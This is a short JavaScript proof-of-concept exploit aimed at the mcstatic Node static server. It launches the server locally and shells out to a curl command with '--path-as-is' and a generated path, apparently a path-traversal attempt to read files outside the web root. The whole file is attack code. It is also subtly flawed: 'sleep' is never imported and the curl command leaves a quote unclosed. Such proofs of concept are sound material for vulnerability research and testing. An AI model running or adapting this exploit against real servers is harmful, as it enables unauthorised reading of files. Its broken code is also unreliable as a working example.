function exploitFunction(payload) {
  const { genstr } = payload;

  // Start the server
  const server = "node ./node_modules/mcstatic/bin/mcstatic";
  const { exec } = require("child_process");
  exec(server, (error, stdout) => {});

  // Sleep to allow the server to start
  sleep.sleep(2);

  // Craft the attack string
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr(50)}`;

  // Execute the attack string
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing attack: ${error}`);
      return;
    }
    console.log(`Output: ${stdout}`);
  });
}

module.exports = { exploitFunction };